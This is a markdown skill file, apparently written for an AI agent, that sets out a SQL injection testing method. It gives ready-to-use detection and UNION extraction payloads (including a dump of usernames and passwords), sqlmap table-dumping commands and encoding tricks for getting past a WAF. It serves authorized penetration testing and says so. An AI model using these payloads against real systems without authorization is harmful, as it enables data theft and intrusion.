---
name: sql-injection-testing
description: Professional skills and methodology for SQL injection testing
version: 1.0.0
---

# SQL Injection Testing Skills

## Overview

SQL injection is a common and dangerous web application vulnerability. This skill provides systematic SQL injection testing methods, detection techniques, and exploitation strategies.

## Testing Methods

### 1. Parameter Identification
- Identify all user input points: URL parameters, POST data, HTTP headers, Cookies, etc.
- Focus on: id, search, filter, sort, and similar parameters
- Use Burp Suite or similar tools to intercept and modify requests

### 2. Basic Detection
- Single quote test: `'` - Check if SQL errors appear
- Boolean blind injection: `' AND '1'='1` vs `' AND '1'='2`
- Time-based blind injection: `' AND SLEEP(5)--`
- Union query: `' UNION SELECT NULL--`

### 3. Database Identification
- MySQL: `' AND @@version LIKE '%mysql%'--`
- PostgreSQL: `' AND version() LIKE '%PostgreSQL%'--`
- MSSQL: `' AND @@version LIKE '%Microsoft%'--`
- Oracle: `' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%'--`

### 4. Information Extraction
- Database name: `' UNION SELECT database()--`
- Table names: `' UNION SELECT table_name FROM information_schema.tables--`
- Column names: `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--`
- Data extraction: `' UNION SELECT username,password FROM users--`

## Tool Usage

### sqlmap
```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# Specify parameter
sqlmap -u "http://target.com/page" --data="id=1" --method=POST

# Specify database type
sqlmap -u "http://target.com/page?id=1" --dbms=mysql

# Get database list
sqlmap -u "http://target.com/page?id=1" --dbs

# Get tables
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Get data
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
```

### Manual Testing
- Use Burp Suite's Repeater module
- Use browser developer tools
- Write Python scripts for automated testing

## Bypass Techniques

### WAF Bypass
- Encoding bypass: URL encoding, Unicode encoding, hexadecimal encoding
- Comment bypass: `/**/`, `--`, `#`
- Mixed case: `SeLeCt`, `UnIoN`
- Space replacement: `/**/`, `+`, `%09`(Tab), `%0A`(newline)

### Examples
```
Original: ' UNION SELECT NULL--
Bypass 1: '/**/UNION/**/SELECT/**/NULL--
Bypass 2: '%55nion%20select%20null--
Bypass 3: '/*!UNION*//*!SELECT*/null--
```

## Validation and Reporting

### Validation Steps
1. Confirm the ability to execute SQL statements
2. Extract database information for verification
3. Assess impact scope (data leakage, privilege escalation, etc.)
4. Document complete POC (request/response)

### Reporting Key Points
- Vulnerability location and parameters
- Affected data and systems
- Complete exploitation steps
- Remediation recommendations (parameterized queries, input validation, etc.)

## Notes

- Only perform testing in authorized test environments
- Avoid causing damage to production data
- Use caution with dangerous operations like DROP and DELETE
- Record all testing steps for reproducibility
